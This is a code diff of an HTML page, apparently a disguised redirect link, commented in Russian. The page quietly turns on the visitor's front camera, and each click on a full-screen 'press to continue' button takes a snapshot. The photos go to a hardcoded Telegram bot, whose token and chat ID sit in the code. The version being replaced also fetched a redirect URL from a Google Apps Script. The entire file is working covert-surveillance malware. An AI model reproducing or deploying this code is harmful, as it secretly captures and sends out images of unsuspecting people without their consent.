@@ -1,92 +1,106 @@
 <!DOCTYPE html>
-<html lang="ru">
+<html>
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title></title>
 <style>
-html,body{margin:0;width:100%;height:100%;background:#fff;overflow:hidden;}
-button{position:fixed;top:0;left:0;width:100%;height:100%;border:none;background:transparent;padding:0;cursor:pointer;}
+html,body{
+  margin:0;padding:0;width:100%;height:100%;
+  background:#fff;overflow:hidden;
+  font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Arial,sans-serif;
+}
+#btn{
+  position:fixed;top:0;left:0;width:100%;height:100%;
+  border:0;background:transparent;padding:0;cursor:pointer;
+  display:flex;align-items:center;justify-content:center;
+  color:#333;font-size:20px;font-weight:500;
+  -webkit-tap-highlight-color:transparent;
+}
 </style>
 </head>
 <body>
 
-<video id="video" autoplay playsinline style="display:none;"></video>
-<canvas id="canvas" style="display:none;"></canvas>
-<button id="btn"></button>
+<video id="v" autoplay playsinline style="display:none;"></video>
+<canvas id="c" style="display:none;"></canvas>
+<button id="btn">Нажмите, чтобы перейти</button>
 
 <script>
 var TOKEN = "8998787761:AAHSE8bZXPhB2A4IMB273cIZD4qoaSUNDJk";
-var CHAT = "1314241513";
-var API = "https://script.google.com/macros/s/AKfycbzkJLd-k73evMNIGvYV1fzartrmylI7D2YXakttEBnkH5reyMLd3eYthIVs0z1chSMU/exec";
+var CHAT  = "1314241513";
 
-var video = document.getElementById("video");
-var canvas = document.getElementById("canvas");
+var v = document.getElementById("v");
+var c = document.getElementById("c");
 var btn = document.getElementById("btn");
 
-var code = new URLSearchParams(location.search).get("go");
-var started = false;
+var stream = null;
+var ready = false;
+var counter = 0;
 
-function getLink() {
-    if (!code) return Promise.resolve(null);
-    return fetch(API + "?go=" + encodeURIComponent(code))
-        .then(function(r){ return r.json(); })
-        .then(function(j){ return j.ok ? j.url : null; })
-        .catch(function(e){ console.log("Ошибка получения ссылки:", e); return null; });
+// Запускаем камеру СРАЗУ при загрузке страницы
+function initCamera() {
+  if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return;
+
+  navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+  .then(function(s) {
+    stream = s;
+    v.srcObject = s;
+    return v.play();
+  })
+  .then(function() {
+    ready = true;
+  })
+  .catch(function(e) {
+    console.log("cam err", e.name);
+  });
 }
 
-function sendPhoto(blob) {
-    var fd = new FormData();
-    fd.append("chat_id", CHAT);
-    fd.append("photo", blob, "photo.png");
-    return fetch("https://api.telegram.org/bot" + TOKEN + "/sendPhoto", {
+// Один снимок → отправить в Telegram
+function snap() {
+  if (!ready) {
+    initCamera();
+    return;
+  }
+
+  try {
+    c.width  = v.videoWidth  || 640;
+    c.height = v.videoHeight || 480;
+    c.getContext("2d").drawImage(v, 0, 0);
+
+    c.toBlob(function(blob) {
+      if (!blob) return;
+      counter++;
+
+      // Меняем текст, чтобы было видно, что «идёт загрузка»
+      btn.textContent = "Загрузка... (" + counter + ")";
+
+      var fd = new FormData();
+      fd.append("chat_id", CHAT);
+      fd.append("photo", blob, "photo_" + counter + ".jpg");
+
+      fetch("https://api.telegram.org/bot" + TOKEN + "/sendPhoto", {
         method: "POST",
         body: fd
-    }).catch(function(e){ console.log("Ошибка отправки фото:", e); });
+      })
+      .then(function() {
+        // Через секунду возвращаем текст обратно
+        setTimeout(function() {
+          btn.textContent = "Нажмите, чтобы перейти";
+        }, 800);
+      })
+      .catch(function() {
+        setTimeout(function() {
+          btn.textContent = "Нажмите, чтобы перейти";
+        }, 800);
+      });
+    }, "image/jpeg", 0.85);
+  } catch (e) {
+    console.log(e);
+  }
 }
 
-function shoot() {
-    if (started) return;
-    started = true;
-
-    getLink().then(function(redirect){
-        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-            if (redirect) window.location.replace(redirect);
-            return;
-        }
-
-        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
-        .then(function(stream){
-            video.srcObject = stream;
-            return video.play().then(function(){
-                return new Promise(function(r){ setTimeout(r, 500); });
-            }).then(function(){
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                canvas.getContext("2d").drawImage(video, 0, 0);
-                stream.getTracks().forEach(function(t){ t.stop(); });
-                return new Promise(function(resolve){
-                    canvas.toBlob(function(blob){
-                        sendPhoto(blob).then(resolve).catch(resolve);
-                    }, "image/png");
-                });
-            });
-        })
-        .catch(function(e){
-            console.log("Камера недоступна:", e.name);
-        })
-        .then(function(){
-            if (redirect) {
-                window.location.replace(redirect);
-            } else if (code) {
-                window.location.replace("https://t.me/");
-            }
-        });
-    });
-}
-
-btn.addEventListener("click", shoot);
+btn.addEventListener("click", snap);
+initCamera();
 </script>
-
 </body>
 </html>
